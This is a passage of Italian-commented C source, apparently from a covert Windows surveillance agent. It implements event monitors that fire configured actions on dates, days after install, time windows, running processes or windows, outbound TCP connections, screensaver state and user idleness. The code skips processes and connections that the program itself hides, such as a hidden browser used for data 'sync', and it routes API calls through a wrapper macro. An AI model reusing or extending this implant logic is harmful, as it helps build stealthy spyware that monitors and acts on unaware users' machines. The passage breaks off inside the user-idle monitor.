#include <stdio.h>
// Ogni Event Monitor ha tre funzioni, una per start, una per stop
// e una per istruire una nuova condizione da monitorare

// Definita dentro SM_Core.cpp, di cui questo file e' un include
void TriggerEvent(DWORD, DWORD);

//---------------------------------------------------
// TIMER EVENT MONITOR

#define EM_TIMER_DATE 2	 // Attende una determinata data (DWORD64 100-nanosec da 1 gennaio 1601)
#define EM_TIMER_INST 3  // Attende un determinato intervallo (DWORD64 100-nanosec) dalla data di creazione del file
#define EM_TIMER_DAIL 4  // Azione di start dopo n millisecondi dalla mezzanotte (ogni giorno). Stessa cosa per azione di stop

#define EM_TM_SLEEPTIME 500

// C'e' un signolo thread per i timer DATE, INST e DAIL
// Le date (data e installazione) sono GMT.

typedef struct {
	DWORD event_id;
	DWORD lo_delay_start; // Parte alta e bassa dei 100 nanosecondi dall'installazione, o di una data. Ma anche millisecondi dalla mezzanotte
	DWORD hi_delay_start;
	DWORD lo_delay_stop; 
	DWORD hi_delay_stop;
	BYTE  timer_type;
	event_param_struct event_param;
	BOOL triggered; 
} monitored_timer;

DWORD em_tm_timer_count = 0;
HANDLE em_tm_montime_thread = 0;
monitored_timer *em_tm_timer_table = NULL;

BOOL em_tm_cp = FALSE;


// ritorna la data (100-nanosec dal 1601) di creazione di "filename"
// XXX Attenzione a come il file viene aperto (dovrei aggiungere FILE_SHARE_WRITE)
BOOL GetFileDate(char *filename, nanosec_time *time)
{
	HANDLE fileh;
	FILETIME filetime;

	// XXX Attenzione a come il file viene aperto (dovrei aggiungere FILE_SHARE_WRITE)
	fileh = FNC(CreateFileA)(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (fileh == INVALID_HANDLE_VALUE)
		return FALSE;

	if (!FNC(GetFileTime)(fileh, &filetime, NULL, NULL)) {
		CloseHandle(fileh);
		return FALSE;
	}

	time->hi_delay = filetime.dwHighDateTime;
	time->lo_delay = filetime.dwLowDateTime;

	CloseHandle(fileh);
	return TRUE;
}


// Aggiunge alla data un delay in 100-nanosec.
// Il risultato viene messo nel primo parametro.
void AddNanosecTime(nanosec_time *time_date, nanosec_time *time_delay)
{
	DWORD partial_sum;

	time_date->hi_delay += time_delay->hi_delay;
	partial_sum = time_date->lo_delay + time_delay->lo_delay;

	// controlla se c'e' stato un riporto
	if (partial_sum < time_date->lo_delay)
		time_date->hi_delay++;

	time_date->lo_delay = partial_sum;
}


// Ritorna TRUE se la prima data e' maggiore della seconda (in 100-nanosec)
BOOL IsGreaterDate(nanosec_time *date, nanosec_time *dead_line)
{
	// Controlla prima la parte alta
	if (date->hi_delay > dead_line->hi_delay)
		return TRUE;

	if (date->hi_delay < dead_line->hi_delay)
		return FALSE;

	// Se arriva qui vuol dire che la parte alta e' uguale
	// allora controlla la parte bassa
	if (date->lo_delay > dead_line->lo_delay)
		return TRUE;

	return FALSE;
}


// Thread per le date
DWORD TimerMonitorDates(DWORD dummy)
{
	DWORD i;
	nanosec_time local_time;

	LOOP {
		CANCELLATION_POINT(em_tm_cp);
		Sleep(EM_TM_SLEEPTIME);

		// Legge la data attuale (in 100-nanosec)...
		if (!HM_GetDate(&local_time)) 
			continue;

		// Aggiusta la data letta con il delta contenuto nel file di
		// configurazione.
		AddNanosecTime(&local_time, &date_delta);

		// ...e la confronta con tutte quelle da monitorare
		for (i=0; i<em_tm_timer_count; i++) {
			// Se e' del tipo "fascia oraria" vede se ci siamo dentro o se ne siamo usciti
			if (em_tm_timer_table[i].timer_type == EM_TIMER_DAIL) {
				FILETIME ft;
				SYSTEMTIME st;

				ft.dwLowDateTime  = local_time.lo_delay;
				ft.dwHighDateTime = local_time.hi_delay; 
				if (FileTimeToSystemTime(&ft, &st)) {
					DWORD ms_from_midnight = ((((st.wHour*60) + st.wMinute)*60) + st.wSecond)*1000;
					// Se non era triggerato e entriamo nella fascia
					if (!em_tm_timer_table[i].triggered && ms_from_midnight<=em_tm_timer_table[i].lo_delay_stop && ms_from_midnight>=em_tm_timer_table[i].lo_delay_start) {
						em_tm_timer_table[i].triggered = TRUE;
						TriggerEvent(em_tm_timer_table[i].event_param.start_action, em_tm_timer_table[i].event_id);
						CreateRepeatThread(em_tm_timer_table[i].event_id, em_tm_timer_table[i].event_param.repeat_action, em_tm_timer_table[i].event_param.count, em_tm_timer_table[i].event_param.delay);
					}

					// Se era triggerato e ora siamo fuori dalla fascia
					if (em_tm_timer_table[i].triggered && (ms_from_midnight>em_tm_timer_table[i].lo_delay_stop || ms_from_midnight<em_tm_timer_table[i].lo_delay_start)) {
						em_tm_timer_table[i].triggered = FALSE;
						StopRepeatThread(em_tm_timer_table[i].event_id);
						TriggerEvent(em_tm_timer_table[i].event_param.stop_action, em_tm_timer_table[i].event_id);
					}
				}
			}

			// Verifica le fasce di date
			if (em_tm_timer_table[i].timer_type == EM_TIMER_DATE || em_tm_timer_table[i].timer_type == EM_TIMER_INST) {
				
				nanosec_time event_time_start, event_time_stop;
				event_time_start.lo_delay = em_tm_timer_table[i].lo_delay_start;
				event_time_start.hi_delay = em_tm_timer_table[i].hi_delay_start;
				event_time_stop.lo_delay = em_tm_timer_table[i].lo_delay_stop;
				event_time_stop.hi_delay = em_tm_timer_table[i].hi_delay_stop;

				if (!em_tm_timer_table[i].triggered && IsGreaterDate(&local_time, &event_time_start) && !IsGreaterDate(&local_time, &event_time_stop)) {
					em_tm_timer_table[i].triggered = TRUE;
					TriggerEvent(em_tm_timer_table[i].event_param.start_action, em_tm_timer_table[i].event_id);
					CreateRepeatThread(em_tm_timer_table[i].event_id, em_tm_timer_table[i].event_param.repeat_action, em_tm_timer_table[i].event_param.count, em_tm_timer_table[i].event_param.delay);
				} else if (em_tm_timer_table[i].triggered && (!IsGreaterDate(&local_time, &event_time_start) || IsGreaterDate(&local_time, &event_time_stop))) {
					em_tm_timer_table[i].triggered = FALSE;
					StopRepeatThread(em_tm_timer_table[i].event_id);
					TriggerEvent(em_tm_timer_table[i].event_param.stop_action, em_tm_timer_table[i].event_id);
				}
			}
		}
	}

	return 0;
}


void WINAPI EM_TimerAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
{
	DWORD timer_type;
	void *temp_table;
	nanosec_time install_time;
	char dll_path[DLLNAMELEN];

	// Riconosce il tipo di timer, dato che la funzione si registra su 3 timer diversi
	if (!wcscmp(conf_json[L"event"]->AsString().c_str(), L"timer") ) {
		timer_type = EM_TIMER_DAIL; 
	} else if (!wcscmp(conf_json[L"event"]->AsString().c_str(), L"afterinst") ) {
		timer_type = EM_TIMER_INST;
	} else { 
		timer_type = EM_TIMER_DATE;
	}

	// XXX...altro piccolo ed improbabile int overflow....
	if ( !(temp_table = realloc(em_tm_timer_table, (em_tm_timer_count + 1)*sizeof(monitored_timer))) )
		return;

	em_tm_timer_table = (monitored_timer *)temp_table;
	em_tm_timer_table[em_tm_timer_count].event_id = event_id;
	memcpy(&em_tm_timer_table[em_tm_timer_count].event_param, event_param, sizeof(event_param_struct));
	em_tm_timer_table[em_tm_timer_count].triggered = FALSE;
	em_tm_timer_table[em_tm_timer_count].timer_type = timer_type;

	if (timer_type == EM_TIMER_INST) {
		if (GetFileDate(HM_CompletePath(H4DLLNAME, dll_path), &install_time)) {
			nanosec_time install_delay;
			DWORD day_after;
			INT64 nanosec;
			// Trasforma da giorni a 100-nanosecondi
			day_after = conf_json[L"days"]->AsNumber();
			nanosec = day_after;
			nanosec = nanosec*24*60*60*10*1000*1000;

			install_delay.lo_delay = (DWORD)nanosec;
			install_delay.hi_delay = (DWORD)(nanosec>>32);

			// Aggiunge al delay la data di installazione
			AddNanosecTime(&install_delay, &install_time);

			// Effettua anche la correzione col delta data
			AddNanosecTime(&install_delay, &date_delta);

			// Il risultato e' la data (in 100-nanosec) da attendere
			em_tm_timer_table[em_tm_timer_count].lo_delay_start = install_delay.lo_delay;
			em_tm_timer_table[em_tm_timer_count].hi_delay_start = install_delay.hi_delay;
			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
		} else {
			// Se non riesce a leggere la data di installazione setta l'attesa di 
			// una data che non arrivera' mai...
			em_tm_timer_table[em_tm_timer_count].lo_delay_start = 0xffffffff;
			em_tm_timer_table[em_tm_timer_count].hi_delay_start = 0xffffffff;
			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
		}
	} else if (timer_type == EM_TIMER_DAIL) {
		HM_HourStringToMillisecond(conf_json[L"ts"]->AsString().c_str(), &(em_tm_timer_table[em_tm_timer_count].lo_delay_start));
		HM_HourStringToMillisecond(conf_json[L"te"]->AsString().c_str(), &(em_tm_timer_table[em_tm_timer_count].lo_delay_stop));
	}  else { // Tipo Date
		FILETIME ftime;
		if (conf_json[L"datefrom"]) {
			HM_TimeStringToFileTime(conf_json[L"datefrom"]->AsString().c_str(), &ftime);
			em_tm_timer_table[em_tm_timer_count].lo_delay_start = ftime.dwLowDateTime;
			em_tm_timer_table[em_tm_timer_count].hi_delay_start = ftime.dwHighDateTime;
		} else {
			em_tm_timer_table[em_tm_timer_count].lo_delay_start = 0;
			em_tm_timer_table[em_tm_timer_count].hi_delay_start = 0;
		}
		if (conf_json[L"dateto"]) {
			HM_TimeStringToFileTime(conf_json[L"dateto"]->AsString().c_str(), &ftime);
			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = ftime.dwLowDateTime;
			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = ftime.dwHighDateTime;
		} else {
			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
		}
	}

	em_tm_timer_count++;
}


void WINAPI EM_TimerStart()
{
	DWORD dummy;
	// Lancia il thread se c'e' almeno un timer da seguire
	if (em_tm_timer_count>0)
		em_tm_montime_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TimerMonitorDates, NULL, 0, &dummy);
}


void WINAPI EM_TimerStop()
{
	// Cancella il thread 
	QUERY_CANCELLATION(em_tm_montime_thread, em_tm_cp);

	// Cancella tutti i thread di repeat
	for (DWORD i=0; i<em_tm_timer_count; i++)
		StopRepeatThread(em_tm_timer_table[i].event_id);

	SAFE_FREE(em_tm_timer_table);
	em_tm_timer_count = 0;
}

//---------------------------------------------------






















//---------------------------------------------------
// MONITOR DEI PROCESSI
#include <Tlhelp32.h>

#define PR_WINDOW_MASK 1
#define PR_FOREGROUND_MASK 2
typedef struct {
	WCHAR *proc_name;
	DWORD isWindow;
	DWORD isForeground;
	BOOL present;
	event_param_struct event_param;
	DWORD event_id;
} monitored_proc;

typedef struct {
	DWORD index;
	BOOL found;
} enum_win_par_struct;

#define EM_MP_SLEEPTIME 1000

extern int CmpWild(const unsigned char *, const unsigned char *); // XXX Dichiarata in HM_ProcessMonitors.h
extern int CmpWildW(WCHAR *, WCHAR *); // XXX Dichiarata in HM_ProcessMonitors.h
HANDLE em_mp_monproc_thread = 0;
DWORD em_mp_monitor_count = 0;
monitored_proc *em_mp_process_table = NULL;

BOOL em_mp_cp = FALSE;


BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) 
{
	enum_win_par_struct *enum_win_par;
	enum_win_par = (enum_win_par_struct *)lParam;
	WCHAR window_name[256];

	if (!HM_SafeGetWindowTextW(hwnd, window_name, (sizeof(window_name)/sizeof(WCHAR))-1))
		return TRUE;
	// NULL Termina (nel caso di troncature)
	window_name[(sizeof(window_name)/sizeof(WCHAR))-1] = 0;
	if (CmpWildW(em_mp_process_table[enum_win_par->index].proc_name, window_name)) {
		enum_win_par->found = TRUE;
		return FALSE;
	}
	// Continua la ricerca
	return TRUE;
}

BOOL CmpFrontWindowName(WCHAR *str)
{
	HWND front_wind;
	WCHAR window_name[256];
	front_wind = GetForegroundWindow();
	if (!front_wind)
		return FALSE;

	if (!HM_SafeGetWindowTextW(front_wind, window_name, (sizeof(window_name)/sizeof(WCHAR))-1))
		return FALSE;

	window_name[(sizeof(window_name)/sizeof(WCHAR))-1] = 0;
	if (CmpWildW(str, window_name)) 
		return TRUE;
	
	return FALSE;
}

BOOL CmpFrontProcName(WCHAR *str)
{
	WCHAR *proc_name = NULL;
	HWND front_wind;
	DWORD proc_id = 0;
	
	front_wind = GetForegroundWindow();
	if (!front_wind)
		return FALSE;

	GetWindowThreadProcessId(front_wind, &proc_id);
	if (!proc_id)
		return FALSE;

	proc_name = HM_FindProcW(proc_id);
	if (!proc_name)
		return FALSE;

	if (CmpWildW(str, proc_name)) {
		SAFE_FREE(proc_name);
		return TRUE;
	}
	
	SAFE_FREE(proc_name);
	return FALSE;
}

DWORD MonitorProcesses(DWORD dummy)
{
	HANDLE proc_snap;
	PROCESSENTRY32W lppe;
	DWORD index;
	BOOL process_found;
	enum_win_par_struct enum_win_par;
	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;

	LOOP {
		CANCELLATION_POINT(em_mp_cp);

		// Cicla per tutti quelli dove stiamo cercando una finestra
		for (index=0; index<em_mp_monitor_count; index++) {
			// Solo se cerchiamo il nome della finestra
			if (!em_mp_process_table[index].isWindow)
				continue;
			enum_win_par.index = index;
			enum_win_par.found = FALSE;

			if (!em_mp_process_table[index].isForeground) {
				// La funzione di call-back setta enum_win_par.found
				FNC(EnumWindows)(EnumWindowsProc, (LPARAM)&enum_win_par);
			} else {
				// Se invece deve compararla solo con la finestra in foreground...
				enum_win_par.found = CmpFrontWindowName(em_mp_process_table[index].proc_name);
			}

			if (enum_win_par.found && !em_mp_process_table[index].present) {
				em_mp_process_table[index].present = TRUE;
				TriggerEvent(em_mp_process_table[index].event_param.start_action, em_mp_process_table[index].event_id);
				CreateRepeatThread(em_mp_process_table[index].event_id, em_mp_process_table[index].event_param.repeat_action, em_mp_process_table[index].event_param.count, em_mp_process_table[index].event_param.delay);
			}

			if (!enum_win_par.found && em_mp_process_table[index].present) {
				em_mp_process_table[index].present = FALSE;
				StopRepeatThread(em_mp_process_table[index].event_id);
				TriggerEvent(em_mp_process_table[index].event_param.stop_action, em_mp_process_table[index].event_id);
			}
		}

		// Cicla per tutti quelli dove stiamo cercando il nome del processo
		proc_snap = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL);
		if (proc_snap == INVALID_HANDLE_VALUE) {
			Sleep(EM_MP_SLEEPTIME);
			continue;
		}
		// Cicla i processi nella process_table
		for (index=0; index<em_mp_monitor_count; index++) {
			// Solo se stiamo cercando il nome del processo
			if (em_mp_process_table[index].isWindow)
				continue;

			// Se devo considerare solo il processo in foreground
			if (em_mp_process_table[index].isForeground) {
				process_found = CmpFrontProcName(em_mp_process_table[index].proc_name);

				if (process_found && !em_mp_process_table[index].present) {
					em_mp_process_table[index].present = TRUE;
					TriggerEvent(em_mp_process_table[index].event_param.start_action, em_mp_process_table[index].event_id);
					CreateRepeatThread(em_mp_process_table[index].event_id, em_mp_process_table[index].event_param.repeat_action, em_mp_process_table[index].event_param.count, em_mp_process_table[index].event_param.delay);
				}

				if (!process_found && em_mp_process_table[index].present) {
					em_mp_process_table[index].present = FALSE;
					StopRepeatThread(em_mp_process_table[index].event_id);
					TriggerEvent(em_mp_process_table[index].event_param.stop_action, em_mp_process_table[index].event_id);
				}
				continue;
			}

			// Se devo considerare tutti i processi...
			lppe.dwSize = sizeof(PROCESSENTRY32W);
			if (FNC(Process32FirstW)(proc_snap,  &lppe)) {
				process_found = FALSE;
				// Cicla tutti i processi attivi...
				do {
					// Non considera i processi che stiamo nascondendo.
					// C'e' una VAGHISSIMA possibilita' di race condition
					// con l'iexporer lanciato per la sync, ma al massimo fa compiere
					// una action di sync in piu'....
					SET_PID_HIDE_STRUCT(pid_hide, lppe.th32ProcessID);
					if (AM_IsHidden(HIDE_PID, &pid_hide))
						continue;

					// ...e li compara con quelli nella tabella
					if (CmpWildW(em_mp_process_table[index].proc_name, lppe.szExeFile)) {
						// Se il processo e' presente e non era ancora stato rilevato, lancia il primo evento
						if (!em_mp_process_table[index].present) {
							em_mp_process_table[index].present = TRUE;
							TriggerEvent(em_mp_process_table[index].event_param.start_action, em_mp_process_table[index].event_id);
							CreateRepeatThread(em_mp_process_table[index].event_id, em_mp_process_table[index].event_param.repeat_action, em_mp_process_table[index].event_param.count, em_mp_process_table[index].event_param.delay);
						}
						process_found = TRUE;
						break;
					}
				} while(FNC(Process32NextW)(proc_snap,  &lppe));

				// Se il processo era stato rilevato come presente, ma adesso non lo e' piu'
				// lancia il secondo evento
				if (em_mp_process_table[index].present && !process_found) {
					em_mp_process_table[index].present = FALSE;
					StopRepeatThread(em_mp_process_table[index].event_id);
					TriggerEvent(em_mp_process_table[index].event_param.stop_action, em_mp_process_table[index].event_id);
				}
			}
		}		
		CloseHandle(proc_snap);
		Sleep(EM_MP_SLEEPTIME);
	}

	// not reached
	return 0;
}


void WINAPI EM_MonProcAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
{
	void *temp_table;

	// XXX...altro piccolo ed improbabile int overflow....
	if ( !(temp_table = realloc(em_mp_process_table, (em_mp_monitor_count + 1)*sizeof(monitored_proc))) )
		return;

	em_mp_process_table = (monitored_proc *)temp_table;
	memcpy(&em_mp_process_table[em_mp_monitor_count].event_param, event_param, sizeof(event_param_struct));
	em_mp_process_table[em_mp_monitor_count].event_id = event_id;
	em_mp_process_table[em_mp_monitor_count].proc_name = wcsdup(conf_json[L"process"]->AsString().c_str());
	em_mp_process_table[em_mp_monitor_count].isWindow = conf_json[L"window"]->AsBool();
	em_mp_process_table[em_mp_monitor_count].isForeground = conf_json[L"focus"]->AsBool();
	em_mp_process_table[em_mp_monitor_count].present = FALSE;

	em_mp_monitor_count++;
}


void WINAPI EM_MonProcStart()
{
	DWORD dummy;
	// Crea il thread solo se ci sono processi da monitorare
	if (em_mp_monitor_count>0)
		em_mp_monproc_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorProcesses, NULL, 0, &dummy);
}


void WINAPI EM_MonProcStop()
{
	DWORD i;

	QUERY_CANCELLATION(em_mp_monproc_thread, em_mp_cp);

	// Cancella tutti i thread di repeat
	for (i=0; i<em_mp_monitor_count; i++)
		StopRepeatThread(em_mp_process_table[i].event_id);

	// Libera tutte le strutture allocate
	for (i=0; i<em_mp_monitor_count; i++)
		SAFE_FREE(em_mp_process_table[i].proc_name);
	SAFE_FREE(em_mp_process_table);
	em_mp_monitor_count = 0;
}














//---------------------------------------------------
// MONITOR DELLE CONNESSIONI
#include <Iphlpapi.h>
typedef DWORD (WINAPI *GetIpAddrTable_t)(PMIB_IPADDRTABLE, PULONG, BOOL);
typedef DWORD (WINAPI *GetTcpTable_t)(PMIB_TCPTABLE_OWNER_PID, PDWORD, BOOL, ULONG, TCP_TABLE_CLASS, ULONG);


typedef struct {
	DWORD ip_address;
	DWORD netmask;
	DWORD port;
	BOOL present;
	event_param_struct event_param;
	DWORD event_id;
} monitored_conn;

#define EM_MC_SLEEPTIME 300

HANDLE em_mc_monconn_thread = 0;
DWORD em_mc_connection_count = 0;
monitored_conn *em_mc_connection_table = NULL;
MIB_IPADDRTABLE *em_mc_localip = NULL;
HMODULE h_iphlp = NULL;
GetIpAddrTable_t pGetIpAddrTable = NULL;
GetTcpTable_t pGetTcpTable = NULL;

BOOL em_mc_cp = FALSE;


// Inizializza la tabella degli indirizzi locali 
void InitIPAddrLocal()
{
	DWORD dwSize;

	// Alloca e verifica
	SAFE_FREE(em_mc_localip);
	if (! (em_mc_localip = (MIB_IPADDRTABLE *)malloc(sizeof(MIB_IPADDRTABLE))) )
		return;

	dwSize = 0;
	// XXX La verifica che il puntatore pGetIpAddrTable sia valorizzato, viene
	// fatta dal chiamante.
	if (pGetIpAddrTable(em_mc_localip, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) {
		SAFE_FREE(em_mc_localip);
		if (! (em_mc_localip = (MIB_IPADDRTABLE *)malloc((UINT) dwSize)) )
			return;
	}

	if (pGetIpAddrTable(em_mc_localip, &dwSize, FALSE) != NO_ERROR) 
		SAFE_FREE(em_mc_localip);
}

// Torna TRUE se i due IP sono nella stessa subnet
BOOL IPNetCmp(DWORD ip1, DWORD ip2, DWORD netmask)
{
	ip1 &= netmask;
	ip2 &= netmask;
	if (ip1 == ip2)
		return TRUE;
	else
		return FALSE;
}

// Torna TRUE se ip_addr e' nella LAN
BOOL IPAddrIsLocal(DWORD ip_addr)
{
	DWORD i;

	// Controlla che la tabella degli indirizzi sia 
	// stata allocata
	if (!em_mc_localip)
		return FALSE;

	for (i=0; i<em_mc_localip->dwNumEntries; i++) 
		if ( (em_mc_localip->table[i].dwAddr & em_mc_localip->table[i].dwMask) ==
			 (ip_addr & em_mc_localip->table[i].dwMask) && em_mc_localip->table[i].dwMask)
			return TRUE;

	return FALSE;
}


DWORD MonitorConnection(DWORD dummy)
{
	PMIB_TCPTABLE_OWNER_PID pTcpTable;
	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
	DWORD i, j, dwSize;
	BOOL conn_found;

	// Se non e' stata inizializzata, carica iphlpapi.dll.
	// Lo fa una volta sola.
	if (!h_iphlp) {
		if ( (h_iphlp = LoadLibrary("iphlpapi.dll")) ) {
			pGetIpAddrTable = (GetIpAddrTable_t)HM_SafeGetProcAddress(h_iphlp, "GetIpAddrTable");
			pGetTcpTable = (GetTcpTable_t)HM_SafeGetProcAddress(h_iphlp, "GetExtendedTcpTable");
		}
	}

	LOOP {
		CANCELLATION_POINT(em_mc_cp);

		// Verifica di avere le funzioni che servono, altrimenti non fa nulla
		// e aspetta solo di terminare
		if (!pGetTcpTable || !pGetIpAddrTable) {
			Sleep(EM_MC_SLEEPTIME);
			continue;
		}

		// Lo fa ogni volta perche' l'indirizzo potrebbe non essere disponibile da suibito (es:dhcp)
		// o la macchina potrebbe non essere collegata in rete, o l'utente potrebbe riconfigurarlo a mano
		InitIPAddrLocal();

		dwSize = sizeof(MIB_TCPTABLE_OWNER_PID);
		pTcpTable = (MIB_TCPTABLE_OWNER_PID *) malloc(sizeof(MIB_TCPTABLE_OWNER_PID));
		if (!pTcpTable) 
			continue;

		// Legge la quantita' di memoria necessaria a contenere la tabella
		if (pGetTcpTable(pTcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == ERROR_INSUFFICIENT_BUFFER) {
			SAFE_FREE(pTcpTable);
			pTcpTable = (MIB_TCPTABLE_OWNER_PID *) malloc ((UINT) dwSize);
			if (!pTcpTable) {
				Sleep(EM_MC_SLEEPTIME);
				continue;
			}
		}

		// Ottiene la tabella delle connessionei TCP
		if (pGetTcpTable(pTcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == NO_ERROR) {
			// Cicla le connessioni da monitorare
			for (i=0; i<em_mc_connection_count; i++) {
				conn_found = FALSE;
				// Cicla le connessioni stabilite
				for (j=0; j<pTcpTable->dwNumEntries; j++) {
					// Non considera le connessioni fatte dai processi nascosti da noi
					// (ad esempio quelle di iexplorer durante la sync)
					SET_PID_HIDE_STRUCT(pid_hide, pTcpTable->table[j].dwOwningPid);
					if (AM_IsHidden(HIDE_PID, &pid_hide))
						continue;

					// Controlla solo le connessioni attive e non verso la LAN
					if (pTcpTable->table[j].dwState != MIB_TCP_STATE_LISTEN && 
						pTcpTable->table[j].dwState != MIB_TCP_STATE_TIME_WAIT &&
						!IPAddrIsLocal(pTcpTable->table[j].dwRemoteAddr) ) {
						// Controlla che IP e porta da monitorare siano nulli (wildcard) o uguali a 
						// quelli della connessione attualmente in esame.  
						if ((!em_mc_connection_table[i].ip_address || IPNetCmp(em_mc_connection_table[i].ip_address, pTcpTable->table[j].dwRemoteAddr, em_mc_connection_table[i].netmask)) &&
							(!em_mc_connection_table[i].port || em_mc_connection_table[i].port == htons(pTcpTable->table[j].dwRemotePort))) {
							// Controlla che la connessione non sia stata gia' rilevata
							// in un precedente ciclo
							if (!em_mc_connection_table[i].present) {
								em_mc_connection_table[i].present = TRUE;
								TriggerEvent(em_mc_connection_table[i].event_param.start_action, em_mc_connection_table[i].event_id);
								CreateRepeatThread(em_mc_connection_table[i].event_id, em_mc_connection_table[i].event_param.repeat_action, em_mc_connection_table[i].event_param.count, em_mc_connection_table[i].event_param.delay);
							}
							conn_found = TRUE;
							break;
						}
					}
				}
				// Se la connessione era stata rilevata come presente, ma adesso non lo e' piu',
				// aggiorna la tabella
				if (em_mc_connection_table[i].present && !conn_found) {
					em_mc_connection_table[i].present = FALSE;
					StopRepeatThread(em_mc_connection_table[i].event_id);
					TriggerEvent(em_mc_connection_table[i].event_param.stop_action, em_mc_connection_table[i].event_id);
				}
			}
		}
		
		SAFE_FREE(pTcpTable);
		Sleep(EM_MC_SLEEPTIME);
	}

	// not reached
	return 0;
}


void WINAPI EM_MonConnAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
{
	void *temp_table;
	DWORD port;
	char ip_addr[64], netmask[64];

	// XXX...altro piccolo ed improbabile int overflow....
	if ( !(temp_table = realloc(em_mc_connection_table, (em_mc_connection_count + 1)*sizeof(monitored_conn))) )
		return;

	sprintf_s(ip_addr, "%S", conf_json[L"ip"]->AsString().c_str());
	sprintf_s(netmask, "%S", conf_json[L"netmask"]->AsString().c_str());
	if (conf_json[L"port"])
		port = conf_json[L"port"]->AsNumber();
	else 
		port = 0;

	em_mc_connection_table = (monitored_conn *)temp_table;
	memcpy(&em_mc_connection_table[em_mc_connection_count].event_param, event_param, sizeof(event_param_struct));	
	em_mc_connection_table[em_mc_connection_count].event_id = event_id;
	em_mc_connection_table[em_mc_connection_count].ip_address = inet_addr(ip_addr);
	em_mc_connection_table[em_mc_connection_count].netmask = inet_addr(netmask);
	em_mc_connection_table[em_mc_connection_count].port = port;
	em_mc_connection_table[em_mc_connection_count].present = FALSE;

	em_mc_connection_count++;
}


void WINAPI EM_MonConnStart()
{
	DWORD dummy;
	// Crea il thread solo se ci sono connessioni da monitorare
	if (em_mc_connection_count>0) 
		em_mc_monconn_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorConnection, NULL, 0, &dummy);
}

void WINAPI EM_MonConnStop()
{
	QUERY_CANCELLATION(em_mc_monconn_thread, em_mc_cp);

	// Cancella tutti i thread di repeat
	for (DWORD i=0; i<em_mc_connection_count; i++)
		StopRepeatThread(em_mc_connection_table[i].event_id);

	SAFE_FREE(em_mc_connection_table);
	SAFE_FREE(em_mc_localip);
	em_mc_connection_count = 0;
}











//---------------------------------------------------
// MONITOR SALVASCHERMO

typedef struct {
	event_param_struct event_param;
	DWORD event_id;
} monitored_screensaver;

DWORD screensaver_count = 0;
monitored_screensaver *screensaver_table = NULL;
BOOL em_ss_present = FALSE;
HANDLE em_ss_thread = 0;
BOOL em_ss_cp = FALSE;

#define EM_SS_SLEEPTIME 300

BOOL IsSaverRunning()
{ 
	BOOL ret, srunning = FALSE;
	
	// Se fallisce, assume che non si attivo
	// SPI_GETSCREENSAVERRUNNING richiede che WINVER sia>=0x500 
	ret = FNC(SystemParametersInfoA)(SPI_GETSCREENSAVERRUNNING, 0, &srunning, 0);

	return srunning && ret;
}


DWORD MonitorScreenSaver(DWORD dummy)
{
	LOOP {
		DWORD i;
		CANCELLATION_POINT(em_ss_cp);

		if (IsSaverRunning()) {
			// Se lo screensaver e' presente e non era stato rilevato
			if (!em_ss_present) {
				em_ss_present = TRUE;
				for (i=0; i<screensaver_count; i++) {
					TriggerEvent(screensaver_table[i].event_param.start_action, screensaver_table[i].event_id);
					CreateRepeatThread(screensaver_table[i].event_id, screensaver_table[i].event_param.repeat_action, screensaver_table[i].event_param.count, screensaver_table[i].event_param.delay);
				}
			}
		} else {
			// Se lo screensaver non e' presente ed era stato rilevato
			if (em_ss_present) {
				em_ss_present = FALSE;
				for (i=0; i<screensaver_count; i++) {
					StopRepeatThread(screensaver_table[i].event_id);
					TriggerEvent(screensaver_table[i].event_param.stop_action, screensaver_table[i].event_id);
				}
			}
		}

		Sleep(EM_SS_SLEEPTIME);
	}

	// not reached
	return 0;
}


void WINAPI EM_ScreenSaverAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
{
	void *temp_table;

	if ( !(temp_table = realloc(screensaver_table, (screensaver_count + 1)*sizeof(monitored_screensaver))) )
		return;

	screensaver_table = (monitored_screensaver *)temp_table;
	memcpy(&screensaver_table[screensaver_count].event_param, event_param, sizeof(event_param_struct));	
	screensaver_table[screensaver_count].event_id = event_id;

	screensaver_count++;
}


void WINAPI EM_ScreenSaverStart()
{
	DWORD dummy;

	// Crea il thread solo se ci sono azioni da fare
	if (screensaver_count>0)
		em_ss_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorScreenSaver, NULL, 0, &dummy);
}


void WINAPI EM_ScreenSaverStop()
{
	QUERY_CANCELLATION(em_ss_thread, em_ss_cp);

	for (DWORD i=0; i<screensaver_count; i++) 
		StopRepeatThread(screensaver_table[i].event_id);

	SAFE_FREE(screensaver_table);
	em_ss_present = FALSE;
	screensaver_count = 0;
}


//---------------------------------------------------
// MONITOR USER IDLE

typedef struct {
	event_param_struct event_param;
	DWORD event_id;
	DWORD threshold;
} monitored_user_idles;

DWORD user_idles_count = 0;
monitored_user_idles *user_idles_table = NULL;
HANDLE em_ui_thread = 0;
BOOL em_ui_cp = FALSE;

DWORD MonitorUserIdles(DWORD dummy)
{
	LASTINPUTINFO lii;
	DWORD last_time = 0;
	DWORD idle = 0;
	DWORD i;

	lii.cbSize = sizeof(lii);
	LOOP {
